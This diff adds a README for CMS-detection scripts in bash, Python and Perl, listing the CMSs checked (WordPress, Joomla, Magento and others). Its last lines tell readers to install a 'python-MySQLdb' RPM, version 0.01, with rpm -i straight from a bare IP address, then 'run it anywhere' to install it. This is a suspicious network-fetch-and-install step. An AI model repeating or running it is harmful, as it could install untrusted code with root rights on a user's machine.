@@ -1,0 +1,29 @@
+The scripts contained here are for CMS detection. The following CMS's are looked for:
+
+	- WordPress
+	- Joomla
+	- Magento
+	- Drupal
+	- WHMCS
+	- ZenCart
+	- Moodle
+	- PrestaShop
+	- Mambo
+	- OpenCart
+	- vTiger
+	- phpBB
+	- TomatoCart
+	- MyBB
+	- Pligg
+
+Currently the scripts run fastest in this order:
+    - detect.sh		Bash
+    - detect.py		Python
+    - detect.pl		Perl
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Python
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+If you require the python MySQLdb library, you may download the rpm using:
+	rpm -i http://192.187.127.252/rpms/python-MySQLdb-0.01-1.el6.noarch.rpm
+After it downloads, run python-MySQLdb anywhere on your system and it will install
